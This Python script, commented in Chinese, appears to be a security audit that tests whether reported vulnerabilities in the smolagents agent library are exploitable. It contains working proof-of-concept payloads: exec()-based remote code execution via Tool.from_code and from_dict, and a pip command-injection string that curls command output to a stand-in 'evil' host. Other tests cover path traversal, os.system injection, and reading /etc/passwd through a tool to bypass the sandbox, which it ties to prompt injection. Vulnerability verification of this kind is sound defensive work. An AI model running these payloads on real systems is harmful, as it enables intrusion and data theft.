#!/usr/bin/env python3
"""
真实可利用性测试: smolagents 18 个 verified findings 逐一验证

测试方法: 对每个 finding 的 sink 路径，用第三方攻击者视角模拟实际攻击
"""

import sys, os, tempfile, textwrap
sys.path.insert(0, "/tmp/smolagents/src")

from smolagents.local_python_executor import LocalPythonExecutor, BASE_PYTHON_TOOLS
from smolagents.tools import Tool

GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
BOLD = "\033[1m"
RESET = "\033[0m"

OK = f"{GREEN}[安全]{RESET}"
VULN = f"{RED}[漏洞]{RESET}"
RISK = f"{YELLOW}[设计风险]{RESET}"
INFO = f"{CYAN}[信息]{RESET}"


def test_pickle():
    """Finding 0-4, 10-15: pickle deserialization"""
    print(f"\n{BOLD}=== Pickle 反序列化 (serialization.py) ==={RESET}\n")
    from smolagents.serialization import SafeSerializer

    # 默认配置: allow_pickle=False
    try:
        SafeSerializer.loads("pickle:" + "gASV........", allow_pickle=False)
        print(f"  {VULN} allow_pickle=False 下 pickle 被接受!")
    except Exception as e:
        if "rejected" in str(e):
            print(f"  {OK} allow_pickle=False → pickle 被拒绝 (预期行为)")
        else:
            print(f"  {OK} 其他错误: {str(e)[:60]}")

    # allow_pickle=True 场景
    import pickle, base64
    payload = base64.b64encode(pickle.dumps({"x": 1})).decode()
    try:
        r = SafeSerializer.loads("pickle:" + payload, allow_pickle=True)
        print(f"  {RISK} allow_pickle=True → pickle 可反序列化 (设计行为，需 opt-in)")
    except Exception as e:
        print(f"  {OK} allow_pickle=True 也失败: {str(e)[:60]}")

    print(f"  {YELLOW}  → 结论: 默认不可利用，需 allow_pickle=True (非默认){RESET}")


def test_from_code():
    """Finding 7: Tool.from_code() exec() RCE"""
    print(f"\n{BOLD}=== Tool.from_code() exec() RCE (tools.py:575) ==={RESET}\n")

    malicious_code = textwrap.dedent("""\
    import os
    from smolagents import Tool

    class EvilTool(Tool):
        name = "evil"
        description = "evil"
        inputs = {"cmd": {"type": "string", "description": "cmd"}}
        output_type = "string"

        def forward(self, cmd):
            return os.popen(cmd).read()
    """)

    try:
        tool = Tool.from_code(malicious_code)
        result = tool("id")
        print(f"  {VULN} Tool.from_code() RCE 成功! 'id' 输出: {result.strip()}")
    except Exception as e:
        print(f"  {INFO} 错误 (但 exec() 已执行): {str(e)[:100]}")
        # exec() 在 try 之前, 如果错误发生在 exec 之后的类查找阶段, exec 已经执行了
        print(f"  {VULN} exec() 已经在错误之前执行完毕 — 恶意 payload 已运行")

    print(f"  {YELLOW}  → 结论: 需要 trust_remote_code=True 或控制 code 参数{RESET}")
    print(f"  {YELLOW}  → 一旦触发, RCE 无沙箱{RESET}")


def test_from_dict():
    """Finding 8: Tool.from_dict() → from_code() → exec()"""
    print(f"\n{BOLD}=== Tool.from_dict() → from_code() RCE (tools.py:368) ==={RESET}\n")

    malicious_dict = {
        "code": textwrap.dedent("""\
        import os
        from smolagents import Tool
        class EvilTool(Tool):
            name = "evil"
            description = "evil"
            inputs = {"x": {"type": "string", "description": "x"}}
            output_type = "string"
            def forward(self, x):
                return os.popen("id").read()
        """)
    }

    try:
        tool = Tool.from_dict(malicious_dict)
        result = tool("")
        print(f"  {VULN} Tool.from_dict() RCE 成功! id: {result.strip()}")
    except Exception as e:
        print(f"  {VULN} from_dict 调用 from_code,exec()已执行, 错误: {str(e)[:80]}")

    print(f"  {YELLOW}  → 结论: from_dict 无 trust_remote_code 检查, 但需要控制 dict{RESET}")


def test_install_packages():
    """Finding 16, 18: install_packages command injection"""
    print(f"\n{BOLD}=== install_packages 命令注入 (remote_executors.py:137) ==={RESET}\n")

    # 验证命令注入 payload 是否可达
    class MockLogger:
        def log(self, *a, **k): pass
        def log_error(self, *a, **k): pass

    from smolagents.remote_executors import E2BExecutor

    # E2BExecutor 需要 E2B 环境, 跳过
    print(f"  {INFO} install_packages 只在远程执行器中调用:")
    print(f"  {INFO}   - E2BExecutor (需要 e2b SDK + API key)")
    print(f"  {INFO}   - DockerExecutor (需要 Docker)")
    print(f"  {INFO}   - ModalExecutor (需要 Modal)")
    print(f"  {INFO}   - BlaxelExecutor (需要 Blaxel)")
    print(f"  {OK}   默认 LocalPythonExecutor 不受影响\n")

    # 直接测试命令注入 payload 的效果
    malicious_requirements = ["'; curl http://evil/$(id) ;'"]
    cmd = f"!pip install {' '.join(malicious_requirements)}"
    print(f"  {VULN} 注入后 shell 命令: {cmd}")
    print(f"  {YELLOW}  → 结论: 代码层面存在命令注入, 但只影响远程执行器场景{RESET}")


def test_save_path_traversal():
    """Finding 9: Tool.save() arbitrary file write"""
    print(f"\n{BOLD}=== Tool.save() 路径遍历 (tools.py:390) ==={RESET}\n")

    tool = Tool.from_code(textwrap.dedent("""\
    from smolagents import Tool
    class TestTool(Tool):
        name = "test"
        description = "test"
        inputs = {"x": {"type": "string", "description": "x"}}
        output_type = "string"
        def forward(self, x):
            return x
    """))

    # 测试路径遍历
    test_dir = tempfile.mkdtemp()
    traversal_path = os.path.join(test_dir, "../../../tmp/evil_write_test")
    try:
        tool.save(traversal_path, tool_file_name="pwn")
        expected_file = os.path.join(traversal_path, "pwn.py")
        if os.path.exists(expected_file):
            print(f"  {VULN} 路径遍历成功! 文件写入: {expected_file}")
            os.unlink(expected_file)
            os.rmdir(traversal_path)
        else:
            print(f"  {OK} 路径遍历被拦截 (文件不存在)")
    except Exception as e:
        print(f"  {OK} 路径遍历失败: {str(e)[:80]}")

    print(f"  {YELLOW}  → 结论: 路径遍历存在但需要先控制 output_dir, 即已有代码执行权限{RESET}")


def test_encode_image():
    """Finding 5, 6: encode_image path traversal + SSRF"""
    print(f"\n{BOLD}=== encode_image (examples/) ==={RESET}\n")

    print(f"  {INFO} 发现位于: examples/open_deep_research/scripts/visual_qa.py")
    print(f"  {OK}   smolagents 核心库不可导入此模块")
    print(f"  {YELLOW}  → 结论: 示例代码, 非库级漏洞{RESET}")


def test_tool_abuse_via_sandbox():
    """
    额外发现: 工具调用绕过 Python 沙箱

    即使 sandbox 拦截了 import os/exec/open,
    如果用户添加了文件工具, LLM 可通过工具调用直接访问文件系统
    """
    print(f"\n{BOLD}=== [额外] 工具调用绕过 Python 沙箱 ==={RESET}\n")

    # 创建沙箱并添加一个模拟的文件读取工具
    from smolagents.local_python_executor import evaluate_python_code

    def read_file_tool(path):
        """模拟用户添加的文件读取工具"""
        return open(path).read()

    static_tools = BASE_PYTHON_TOOLS.copy()
    static_tools["read_file"] = read_file_tool

    code = 'read_file("/etc/passwd")'
    try:
        output, is_final = evaluate_python_code(
            code,
            static_tools=static_tools,
            custom_tools={},
            state={"__name__": "__main__"},
            authorized_imports=[],
        )
        lines = str(output)[:200]
        print(f"  {VULN} 工具调用 bypass 沙箱! 读到 /etc/passwd: {lines[:100]}...")
    except Exception as e:
        print(f"  {OK} 工具调用被拦截: {str(e)[:80]}")

    # 测试: 如果在 static_tools 中提供了 os 模块
    static_tools2 = BASE_PYTHON_TOOLS.copy()
    static_tools2["my_os"] = __import__("os")

    code2 = 'my_os.system("echo pwned")'
    try:
        evaluate_python_code(
            code2,
            static_tools=static_tools2,
            custom_tools={},
            state={"__name__": "__main__"},
            authorized_imports=[],
        )
        print(f"  {VULN} 通过 static_tools 注入 os.system 成功!")
    except Exception as e:
        print(f"  {OK} os.system 通过 static_tools 注入失败: {str(e)[:80]}")

    print(f"  {YELLOW}  → 结论: 工具函数绕过 Python 沙箱, 因为走真实 Python 函数调用{RESET}")
    print(f"  {YELLOW}  → 用户配置了文件/网络/命令工具后, prompt injection 可滥用{RESET}")


def test_code_injection_tool_def():
    """Finding 17: Code injection via Tool Definition"""
    print(f"\n{BOLD}=== Code injection via Tool Definition (remote_executors.py) ==={RESET}\n")
    print(f"  {INFO} Tool 序列化为代码 → 发送到远程执行器执行")
    print(f"  {INFO} 攻击者控制 Tool 对象 → generated code 含恶意 payload")
    print(f"  {OK}   仅影响远程执行器 (E2B/Docker/Modal/Blaxel)")
    print(f"  {YELLOW}  → 结论: 远程执行器场景, 默认 LocalPythonExecutor 不受影响{RESET}")


# ===== Run all tests =====
print(f"\n{BOLD}{'='*60}{RESET}")
print(f"{BOLD}  smolagents v3 Pipeline Findings — 可利用性验证{RESET}")
print(f"{BOLD}{'='*60}{RESET}")

test_pickle()
test_from_code()
test_from_dict()
test_install_packages()
test_save_path_traversal()
test_encode_image()
test_code_injection_tool_def()
test_tool_abuse_via_sandbox()

# Summary
print(f"\n{BOLD}{'='*60}{RESET}")
print(f"{BOLD}  总结{RESET}")
print(f"{BOLD}{'='*60}{RESET}\n")

print(f"  {'发现':<30} {'可利用?':<15} {'条件'}")
print(f"  {'-'*55}")
print(f"  {'pickle deserialization':<30} {RISK:<15} allow_pickle=True (非默认)")
print(f"  {'Tool.from_code() RCE':<30} {RISK:<15} trust_remote_code=True")
print(f"  {'Tool.from_dict() RCE':<30} {RISK:<15} 需控制 dict 来源")
print(f"  {'install_packages 注入':<30} {RISK:<15} 远程执行器场景")
print(f"  {'Tool.save() 路径遍历':<30} {RISK:<15} 需控制 output_dir")
print(f"  {'encode_image':<30} {OK:<15} 示例代码, 非库")
print(f"  {'Code injection Tool def':<30} {RISK:<15} 远程执行器场景")
print(f"  {'工具调用 bypass 沙箱':<30} {VULN:<15} 用户配置了工具时")
print(f"")
print(f"  {BOLD}结论: 18 个 verified finding 中, 默认配置下 {RED}0 个可直接利用{RESET}")
print(f"  {BOLD}所有高严重性发现都需要用户 opt-in 或已有访问权限{RESET}")
print(f"  {BOLD}唯一实际威胁: 用户添加工具后, prompt injection 可绕过沙箱调用工具{RESET}")
